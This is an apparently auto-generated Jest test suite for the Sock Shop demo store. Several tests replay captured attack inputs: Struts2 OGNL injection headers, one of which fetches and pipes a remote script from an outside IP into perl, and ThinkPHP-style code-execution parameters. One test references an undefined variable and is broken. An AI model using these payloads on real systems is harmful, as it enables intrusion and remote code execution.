const authenticate = require("./authentication");
const {CSSselect, JSONBuild, JSONPath, clearSession, dataset, getHttpClient, urlencode} = require("./up9lib");

describe.each(dataset("data/1/dataset_1.json"))("test_001_get_", (amp_cache_transform, content, keep_alive, param, postman_token, r, s, vars_0_, x_datadog_parent_id, x_datadog_trace_id) => {
    it("test_001_get_", () => {
        clearSession();

        // GET http://front-end.sock-shop/ (endp 1)
        const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
        return front_end_sock_shop.fetch("/" + urlencode([["", param], ["XDEBUG_SESSION_START", "phpstorm"], ["a", "fetch"], ["content", content], ["debug", "1"], ["function", "call_user_func_array"], ["q", "login.destroy.session"], ["r", r], ["s", s], ["up_auto_log", "true"], ["vars[0]", vars_0_]]), {
            headers: {
                "accept": "text/html",
                "amp-cache-transform": amp_cache_transform,
                "keep-alive": keep_alive,
                "postman-token": postman_token,
                "x-datadog-parent-id": x_datadog_parent_id,
                "x-datadog-sampling-priority": "0",
                "x-datadog-trace-id": x_datadog_trace_id
            }
        })
        .then((response) => {
            expect(response.status).toEqual(200);
            return response.text();
        })
        .then((text) => {
            expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
        })
        .then((data) => {
        });
    });
});

describe.each(dataset("data/125/dataset_125.json"))("test_125_get_", (content) => {
    it("test_125_get_", () => {
        clearSession();

        // GET http://front-end.sock-shop/ (endp 125)
        const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
        return front_end_sock_shop.fetch("/" + urlencode([["a", "fetch"], ["content", content]]), {
            headers: {
                "content-type": "application/json"
            }
        })
        .then((response) => {
            expect(response.status).toEqual(200);
            return response.text();
        })
        .then((text) => {
            expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
        })
        .then((data) => {
        });
    });
});

it("test_187_get_", () => {
    clearSession();

    // GET http://front-end.sock-shop/ (endp 187)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/", {
        headers: {
            "content-type": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X30mknbA'"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
    })
    .then((data) => {
    });
});

it("test_190_get_", () => {
    clearSession();

    // GET http://front-end.sock-shop/ (endp 190)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/", {
        headers: {
            "content-type": "application/x-www-form-urlencoded"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
    })
    .then((data) => {
    });
});

it("test_191_head_", () => {
    clearSession();

    // HEAD http://front-end.sock-shop/ (endp 191)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/", {
        method: "HEAD"
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
    })
    .then((data) => {
    });
});

it("test_192_get_", () => {
    clearSession();

    // GET http://front-end.sock-shop/ (endp 192)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/", {
        headers: {
            "content-type": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('x4KNnCMm'"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
    })
    .then((data) => {
    });
});

it("test_193_get_", () => {
    clearSession();

    // GET http://front-end.sock-shop/ (endp 193)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/", {
        headers: {
            "content-type": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('xVSERkYM'"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
    })
    .then((data) => {
    });
});

it("test_194_get_", () => {
    clearSession();

    // GET http://front-end.sock-shop/ (endp 194)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/", {
        headers: {
            "content-type": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('tMeGL0pH'"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
    })
    .then((data) => {
    });
});

it("test_195_get_", () => {
    clearSession();

    // GET http://front-end.sock-shop/ (endp 195)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/", {
        headers: {
            "content-type": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('Uhk9c9CM'"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
    })
    .then((data) => {
    });
});

it("test_207_get_", () => {
    clearSession();

    // GET http://front-end.sock-shop/ (endp 207)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/", {
        headers: {
            "content-type": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('qieoAZ6u'"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
    })
    .then((data) => {
    });
});

it("test_211_get_", () => {
    clearSession();

    // GET http://front-end.sock-shop/ (endp 211)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/", {
        headers: {
            "content-type": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('uUVc2U8M'"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
    })
    .then((data) => {
    });
});

it("test_212_get_", () => {
    clearSession();

    // GET http://front-end.sock-shop/ (endp 212)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/", {
        headers: {
            "content-type": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('liape4t0'"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
    })
    .then((data) => {
    });
});

it("test_213_get_", () => {
    clearSession();

    // GET http://front-end.sock-shop/ (endp 213)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/", {
        headers: {
            "content-type": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('uuurxrfw'"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
    })
    .then((data) => {
    });
});

it("test_214_get_", () => {
    clearSession();

    // GET http://front-end.sock-shop/ (endp 214)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/", {
        headers: {
            "content-type": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('jyu8xkii'"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
    })
    .then((data) => {
    });
});

it("test_215_get_", () => {
    clearSession();

    // GET http://front-end.sock-shop/ (endp 215)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/", {
        headers: {
            "content-type": "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='wget -qO - http://209.90.79.141/pdf/s.pdf | perl"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
    })
    .then((data) => {
    });
});

it("test_216_get_", () => {
    clearSession();

    // GET http://front-end.sock-shop/ (endp 216)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/", {
        headers: {
            "content-type": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('dyi8d0Jw'"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
    })
    .then((data) => {
    });
});

it("test_218_get_", () => {
    clearSession();

    // GET http://front-end.sock-shop/ (endp 218)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/", {
        headers: {
            "content-type": "text/html"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
    })
    .then((data) => {
    });
});

it("test_219_get_", () => {
    clearSession();

    // GET http://front-end.sock-shop/ (endp 219)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/", {
        headers: {
            "content-type": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('jycf9lqq'"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
    })
    .then((data) => {
    });
});

it("test_220_get_", () => {
    clearSession();

    // GET http://front-end.sock-shop/ (endp 220)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/", {
        headers: {
            "content-type": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('pkpxommw'"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
    })
    .then((data) => {
    });
});

it("test_225_get_", () => {
    clearSession();

    // GET http://front-end.sock-shop/ (endp 225)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/", {
        headers: {
            "content-type": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('zUn5ygGk'"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
    })
    .then((data) => {
    });
});

it("test_227_get_", () => {
    clearSession();

    // GET http://front-end.sock-shop/ (endp 227)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/", {
        headers: {
            "content-type": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('hnBSMl1i'"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
    })
    .then((data) => {
    });
});

it("test_235_get_", () => {
    clearSession();

    // GET http://front-end.sock-shop/ (endp 235)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/", {
        headers: {
            "content-type": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('o4einzpi'"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
    })
    .then((data) => {
    });
});

it("test_236_get_", () => {
    clearSession();

    // GET http://front-end.sock-shop/ (endp 236)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/", {
        headers: {
            "content-type": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('rfi8x4t9'"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
    })
    .then((data) => {
    });
});

it("test_237_get_", () => {
    clearSession();

    // GET http://front-end.sock-shop/ (endp 237)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/", {
        headers: {
            "content-type": "text/plain"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
    })
    .then((data) => {
    });
});

it("test_238_get_", () => {
    clearSession();

    // GET http://front-end.sock-shop/ (endp 238)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/", {
        headers: {
            "content-type": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('VEh255IZ'"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
    })
    .then((data) => {
    });
});

it("test_241_get_", () => {
    clearSession();

    // GET http://front-end.sock-shop/ (endp 241)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/", {
        headers: {
            "content-type": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('b1ko6ejb'"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
    })
    .then((data) => {
    });
});

describe.each(dataset("data/40/dataset_40.json"))("test_040_get_param", (bs_real_ip, param) => {
    it("test_040_get_param", () => {
        clearSession();

        // GET http://front-end.sock-shop/{param} (endp 40)
        const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
        return front_end_sock_shop.fetch("/" + param, {
            headers: {
                "bs_real_ip": bs_real_ip,
                "x-requested-with": "XMLHttpRequest"
            }
        })
        .then((response) => {
            expect(response.status).toEqual(200);
            return response.text();
        })
        .then((text) => {
            expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
        })
        .then((data) => {
        });
    });
});

describe.each(dataset("data/50/dataset_50.json"))("test_050_get_address", (amp_cache_transform, postman_token) => {
    it("test_050_get_address", () => {
        clearSession();

        // GET http://front-end.sock-shop/address (endp 50)
        const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
        return front_end_sock_shop.fetch("/address", {
            headers: {
                "amp-cache-transform": amp_cache_transform,
                "postman-token": postman_token,
                "x-requested-with": "XMLHttpRequest"
            }
        })
        .then((response) => {
            expect(response.status).toEqual(200);
            return response.text();
        })
        .then((text) => {
            return JSON.parse(text);
        })
        .then((data) => {
            expect(JSONPath({
                path: "$._links.self.href",
                json: data
            })).not.toBeNull();
        });
    });
});

describe.each(dataset("data/170/dataset_170.json"))("test_170_post_addresses", (city, country, number, postman_token, street) => {
    it("test_170_post_addresses", () => {
        clearSession();

        // GET http://front-end.sock-shop/customers/{customerId} (endp 62)
        const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
        return front_end_sock_shop.fetch("/customers/" + String(response.headers.raw()["set-cookie"]["logged_in"]), {
            headers: {
                "postman-token": postman_token,
                "x-requested-with": "XMLHttpRequest"
            }
        })
        .then((response) => {
            expect(response.status).toEqual(200);
            return response.text();
        })
        .then((text) => {
            return JSON.parse(text);
        })
        .then((data) => {
            expect(JSONPath({
                path: "$._links.self.href",
                json: data
            })).not.toBeNull();
            const postcode = JSONPath({
                path: "$.lastName",
                json: data
            })[0];

            // POST http://front-end.sock-shop/addresses (endp 170)
            return front_end_sock_shop.fetch("/addresses", {
                method: "POST",
                headers: {
                    "content-type": "application/json",
                    "x-requested-with": "XMLHttpRequest"
                },
                body: JSONBuild("data/170/payload_for_endp_170.json", {
                    "$.city": city,
                    "$.country": country,
                    "$.number": number,
                    "$.postcode": postcode,
                    "$.street": street
                })
            })
            .then((response) => {
                expect(response.status).toEqual(200);
                return response.text();
            })
            .then((text) => {
                return JSON.parse(text);
            })
            .then((data) => {
                expect(JSONPath({
                    path: "$.id",
                    json: data
                })).not.toBeNull();
            });
        });
    });
});

describe.each(dataset("data/8/dataset_8.json"))("test_008_get_basket_html", (amp_cache_transform) => {
    it("test_008_get_basket_html", () => {
        clearSession();

        // GET http://front-end.sock-shop/basket.html (endp 8)
        const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
        return front_end_sock_shop.fetch("/basket.html", {
            headers: {
                "amp-cache-transform": amp_cache_transform
            }
        })
        .then((response) => {
            expect(response.status).toEqual(200);
            return response.text();
        })
        .then((text) => {
            expect(CSSselect("div#basket div.box form h1", text)).toContain("Shopping cart");
        })
        .then((data) => {
        });
    });
});

describe.each(dataset("data/52/dataset_52.json"))("test_052_get_card", (amp_cache_transform, postman_token) => {
    it("test_052_get_card", () => {
        clearSession();

        // GET http://front-end.sock-shop/card (endp 52)
        const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
        return front_end_sock_shop.fetch("/card", {
            headers: {
                "amp-cache-transform": amp_cache_transform,
                "postman-token": postman_token,
                "x-requested-with": "XMLHttpRequest"
            }
        })
        .then((response) => {
            expect(response.status).toEqual(200);
            return response.text();
        })
        .then((text) => {
            return JSON.parse(text);
        })
        .then((data) => {
            expect(JSONPath({
                path: "$.number",
                json: data
            })).not.toBeNull();
        });
    });
});

describe.each(dataset("data/173/dataset_173.json"))("test_173_post_cards", (ccv, expires, longNum) => {
    it("test_173_post_cards", () => {
        clearSession();

        // POST http://front-end.sock-shop/cards (endp 173)
        const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
        return front_end_sock_shop.fetch("/cards", {
            method: "POST",
            headers: {
                "content-type": "application/json",
                "x-requested-with": "XMLHttpRequest"
            },
            body: JSONBuild("data/173/payload_for_endp_173.json", {
                "$.ccv": ccv,
                "$.expires": expires,
                "$.longNum": longNum
            })
        })
        .then((response) => {
            expect(response.status).toEqual(200);
            return response.text();
        })
        .then((text) => {
            return JSON.parse(text);
        })
        .then((data) => {
            expect(JSONPath({
                path: "$.id",
                json: data
            })).not.toBeNull();
        });
    });
});

describe.each(dataset("data/9/dataset_9.json"))("test_009_post_cart", (amp_cache_transform, postman_token, postman_token1, size, tags) => {
    it("test_009_post_cart", () => {
        clearSession();

        // GET http://front-end.sock-shop/catalogue (endp 11)
        const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
        return front_end_sock_shop.fetch("/catalogue" + urlencode([["page", "1"], ["size", size], ["sort", "id"], ["tags", tags]]), {
            headers: {
                "amp-cache-transform": amp_cache_transform,
                "postman-token": postman_token,
                "x-requested-with": "XMLHttpRequest"
            }
        })
        .then((response) => {
            expect(response.status).toEqual(200);
            return response.text();
        })
        .then((text) => {
            return JSON.parse(text);
        })
        .then((data) => {
            expect(JSONPath({
                path: "$[*].tag[*]",
                json: data
            })).not.toBeNull();
            const id = JSONPath({
                path: "$[*].id",
                json: data
            })[0];

            // POST http://front-end.sock-shop/cart (endp 9)
            return front_end_sock_shop.fetch("/cart", {
                method: "POST",
                headers: {
                    "content-type": "application/json",
                    "postman-token": postman_token1,
                    "x-requested-with": "XMLHttpRequest"
                },
                body: JSONBuild("data/9/payload_for_endp_9.json", {
                    "$.id": id
                })
            })
            .then((response) => {
                expect(response.status).toEqual(201);
                return response.text();
            })
            .then((text) => {
            })
            .then((data) => {
            });
        });
    });
});

describe.each(dataset("data/35/dataset_35.json"))("test_035_get_cart", (amp_cache_transform, postman_token) => {
    it("test_035_get_cart", () => {
        clearSession();

        // GET http://front-end.sock-shop/cart (endp 35)
        const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
        return front_end_sock_shop.fetch("/cart", {
            headers: {
                "amp-cache-transform": amp_cache_transform,
                "postman-token": postman_token,
                "x-requested-with": "XMLHttpRequest"
            }
        })
        .then((response) => {
            expect(response.status).toEqual(200);
            return response.text();
        })
        .then((text) => {
            return JSON.parse(text);
        })
        .then((data) => {
            expect(JSONPath({
                path: "$[*].id",
                json: data
            })).not.toBeNull();
        });
    });
});

describe.each(dataset("data/234/dataset_234.json"))("test_234_post_cart_update", (id) => {
    it("test_234_post_cart_update", () => {
        clearSession();

        // POST http://front-end.sock-shop/cart/update (endp 234)
        const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
        return front_end_sock_shop.fetch("/cart/update", {
            method: "POST",
            headers: {
                "content-type": "application/json",
                "x-requested-with": "XMLHttpRequest"
            },
            body: JSONBuild("data/234/payload_for_endp_234.json", {
                "$.id": id
            })
        })
        .then((response) => {
            expect(response.status).toEqual(202);
            return response.text();
        })
        .then((text) => {
        })
        .then((data) => {
        });
    });
});

describe.each(dataset("data/199/dataset_199.json"))("test_199_get_catalogue", (size, tags) => {
    it("test_199_get_catalogue", () => {
        clearSession();

        // GET http://front-end.sock-shop/catalogue (endp 199)
        const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
        return front_end_sock_shop.fetch("/catalogue" + urlencode([["page", "1"], ["size", size], ["tags", tags]]), {
            headers: {
                "x-requested-with": "XMLHttpRequest"
            }
        })
        .then((response) => {
            expect(response.status).toEqual(200);
            return response.text();
        })
        .then((text) => {
        })
        .then((data) => {
        });
    });
});

describe.each(dataset("data/206/dataset_206.json"))("test_206_get_catalogue", (size) => {
    it("test_206_get_catalogue", () => {
        clearSession();

        // GET http://front-end.sock-shop/catalogue (endp 206)
        const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
        return front_end_sock_shop.fetch("/catalogue" + urlencode([["size", size]]), {
            headers: {
                "x-requested-with": "XMLHttpRequest"
            }
        })
        .then((response) => {
            expect(response.status).toEqual(200);
            return response.text();
        })
        .then((text) => {
        })
        .then((data) => {
        });
    });
});

describe.each(dataset("data/56/dataset_56.json"))("test_056_get_catalogue_id", (amp_cache_transform, postman_token, postman_token1, size, tags) => {
    it("test_056_get_catalogue_id", () => {
        clearSession();

        // GET http://front-end.sock-shop/catalogue (endp 11)
        const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
        return front_end_sock_shop.fetch("/catalogue" + urlencode([["page", "1"], ["size", size], ["sort", "id"], ["tags", tags]]), {
            headers: {
                "amp-cache-transform": amp_cache_transform,
                "postman-token": postman_token,
                "x-requested-with": "XMLHttpRequest"
            }
        })
        .then((response) => {
            expect(response.status).toEqual(200);
            return response.text();
        })
        .then((text) => {
            return JSON.parse(text);
        })
        .then((data) => {
            expect(JSONPath({
                path: "$[*].tag[*]",
                json: data
            })).not.toBeNull();
            const id = JSONPath({
                path: "$[*].id",
                json: data
            })[0];

            // GET http://front-end.sock-shop/catalogue/{id} (endp 56)
            return front_end_sock_shop.fetch("/catalogue/" + id, {
                headers: {
                    "postman-token": postman_token1,
                    "x-requested-with": "XMLHttpRequest"
                }
            })
            .then((response) => {
                expect(response.status).toEqual(200);
                return response.text();
            })
            .then((text) => {
                return JSON.parse(text);
            })
            .then((data) => {
                expect(JSONPath({
                    path: "$.tag[*]",
                    json: data
                })).not.toBeNull();
            });
        });
    });
});

describe.each(dataset("data/36/dataset_36.json"))("test_036_get_catalogue_size", (amp_cache_transform, postman_token, tags) => {
    it("test_036_get_catalogue_size", () => {
        clearSession();

        // GET http://front-end.sock-shop/catalogue/size (endp 36)
        const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
        return front_end_sock_shop.fetch("/catalogue/size" + urlencode([["tags", tags]]), {
            headers: {
                "amp-cache-transform": amp_cache_transform,
                "postman-token": postman_token,
                "x-requested-with": "XMLHttpRequest"
            }
        })
        .then((response) => {
            expect(response.status).toEqual(200);
            return response.text();
        })
        .then((text) => {
            return JSON.parse(text);
        })
        .then((data) => {
            expect(JSONPath({
                path: "$.tag[*]",
                json: data
            })).not.toBeNull();
        });
    });
});

it("test_201_get_catalogue_size", () => {
    clearSession();

    // GET http://front-end.sock-shop/catalogue/size (endp 201)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/catalogue/size" + urlencode([["tags", ""]]), {
        headers: {
            "x-requested-with": "XMLHttpRequest"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
    })
    .then((data) => {
    });
});

describe.each(dataset("data/12/dataset_12.json"))("test_012_get_category_html", (amp_cache_transform, tags) => {
    it("test_012_get_category_html", () => {
        clearSession();

        // GET http://front-end.sock-shop/category.html (endp 12)
        const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
        return front_end_sock_shop.fetch("/category.html" + urlencode([["tags", tags]]), {
            headers: {
                "amp-cache-transform": amp_cache_transform
            }
        })
        .then((response) => {
            expect(response.status).toEqual(200);
            return response.text();
        })
        .then((text) => {
            expect(CSSselect("div#content div.container div div.panel.panel-default.sidebar-menu div.panel-heading h3.panel-title", text)).toContain("Filters ");
        })
        .then((data) => {
        });
    });
});

it("test_242_get_category_html", () => {
    clearSession();

    // GET http://front-end.sock-shop/category.html (endp 242)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/category.html")
    .then((response) => {
        expect(response.status).toEqual(206);
        return response.text();
    })
    .then((text) => {
    })
    .then((data) => {
    });
});

describe.each(dataset("data/60/dataset_60.json"))("test_060_get_customer_order_html", (order, postman_token) => {
    it("test_060_get_customer_order_html", () => {
        clearSession();

        // GET http://front-end.sock-shop/customer-order.html (endp 60)
        const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
        return front_end_sock_shop.fetch("/customer-order.html" + urlencode([["order", order]]), {
            headers: {
                "postman-token": postman_token
            }
        })
        .then((response) => {
            expect(response.status).toEqual(200);
            return response.text();
        })
        .then((text) => {
            expect(CSSselect("div#customer-order div.box h2", text)).toContain("Order #");
        })
        .then((data) => {
        });
    });
});

describe.each(dataset("data/61/dataset_61.json"))("test_061_get_customer_orders_html", (amp_cache_transform, postman_token) => {
    it("test_061_get_customer_orders_html", () => {
        clearSession();

        // GET http://front-end.sock-shop/customer-orders.html (endp 61)
        const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
        return front_end_sock_shop.fetch("/customer-orders.html", {
            headers: {
                "amp-cache-transform": amp_cache_transform,
                "postman-token": postman_token
            }
        })
        .then((response) => {
            expect(response.status).toEqual(200);
            return response.text();
        })
        .then((text) => {
            expect(CSSselect("div#customer-orders div.box h1", text)).toContain("My orders");
        })
        .then((data) => {
        });
    });
});

describe.each(dataset("data/224/dataset_224.json"))("test_224_get_customers", (postman_token) => {
    it("test_224_get_customers", () => {
        clearSession();

        // GET http://front-end.sock-shop/customers (endp 224)
        const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
        return front_end_sock_shop.fetch("/customers", {
            headers: {
                "postman-token": postman_token,
                "x-requested-with": "XMLHttpRequest"
            }
        })
        .then((response) => {
            expect(response.status).toEqual(200);
            return response.text();
        })
        .then((text) => {
            return JSON.parse(text);
        })
        .then((data) => {
            expect(JSONPath({
                path: "$._embedded.customer[*]._links.self.href",
                json: data
            })).not.toBeNull();
        });
    });
});

describe.each(dataset("data/13/dataset_13.json"))("test_013_get_detail_html", (amp_cache_transform, amp_cache_transform1, postman_token, size, tags) => {
    it("test_013_get_detail_html", () => {
        clearSession();

        // GET http://front-end.sock-shop/catalogue (endp 11)
        const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
        return front_end_sock_shop.fetch("/catalogue" + urlencode([["page", "1"], ["size", size], ["sort", "id"], ["tags", tags]]), {
            headers: {
                "amp-cache-transform": amp_cache_transform,
                "postman-token": postman_token,
                "x-requested-with": "XMLHttpRequest"
            }
        })
        .then((response) => {
            expect(response.status).toEqual(200);
            return response.text();
        })
        .then((text) => {
            return JSON.parse(text);
        })
        .then((data) => {
            expect(JSONPath({
                path: "$[*].tag[*]",
                json: data
            })).not.toBeNull();
            const id = JSONPath({
                path: "$[*].id",
                json: data
            })[0];

            // GET http://front-end.sock-shop/detail.html (endp 13)
            return front_end_sock_shop.fetch("/detail.html" + urlencode([["id", id]]), {
                headers: {
                    "amp-cache-transform": amp_cache_transform1
                }
            })
            .then((response) => {
                expect(response.status).toEqual(200);
                return response.text();
            })
            .then((text) => {
                expect(CSSselect("div#content div.container div div.row.same-height-row div div.box.same-height h3", text)).toContain("You may also like these products");
            })
            .then((data) => {
            });
        });
    });
});

it("test_039_get_footer_html", () => {
    clearSession();

    // GET http://front-end.sock-shop/footer.html (endp 39)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/footer.html", {
        headers: {
